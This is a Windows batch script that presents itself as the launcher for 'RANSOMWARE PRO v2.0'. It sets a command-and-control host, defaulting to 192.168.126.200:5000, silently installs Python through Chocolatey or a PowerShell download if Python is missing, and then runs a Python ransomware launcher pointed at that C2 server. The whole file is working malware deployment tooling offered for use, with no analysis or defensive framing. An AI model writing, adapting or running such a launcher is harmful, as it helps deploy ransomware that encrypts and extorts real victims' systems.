@echo off
REM ===================================================
REM RANSOMWARE PRO v2.0 - UNIVERSAL LAUNCHER
REM Auto-downloads Python if needed, runs ransomware
REM ===================================================

echo.
echo ===================================================
echo  RANSOMWARE PRO v2.0 - AUTO LAUNCHER
echo  Will auto-install Python if needed
echo ===================================================
echo.

REM Get C2 host from argument or use default
set C2_HOST=%1
if "!C2_HOST!"=="" set C2_HOST=192.168.126.200

echo [*] C2 Server: !C2_HOST!:5000
echo.

REM Check if Python is available
python --version >nul 2>&1
if %errorlevel% neq 0 (
    echo [!] Python not found, attempting auto-install...
    echo.
    
    REM Try to install via chocolatey
    choco --version >nul 2>&1
    if %errorlevel% equ 0 (
        echo [*] Using Chocolatey to install Python...
        choco install python -y --no-progress >nul 2>&1
    ) else (
        echo [*] Downloading Python 3.11 installer...
        
        REM Download Python
        powershell -NoProfile -Command "
        try {
            $url = 'https://www.python.org/ftp/python/3.11.0/python-3.11.0-amd64.exe'
            $file = 'python-installer.exe'
            Write-Host '[*] Downloading from python.org...'
            (New-Object System.Net.WebClient).DownloadFile($url, $file)
            
            if (Test-Path $file) {
                Write-Host '[*] Running installer...'
                & $file /quiet InstallAllUsers=1 PrependPath=1 | Out-Null
                Remove-Item $file -Force
                Write-Host '[+] Python installed successfully'
            }
        } catch {
            Write-Host '[!] Download failed: $_'
        }
        "
    )
    
    echo.
    echo [*] Python should now be installed, retrying...
    echo.
)

REM Final check
python --version >nul 2>&1
if %errorlevel% neq 0 (
    echo [!] Python still not available!
    echo [!] Please install Python 3.8+ from: https://python.org
    pause
    exit /b 1
)

echo [+] Python ready!
echo.
echo [*] Starting RANSOMWARE PRO v2.0...
echo.

REM Run the Python launcher
python auto_launcher.py !C2_HOST!

echo.
echo [*] Ransomware execution completed
pause
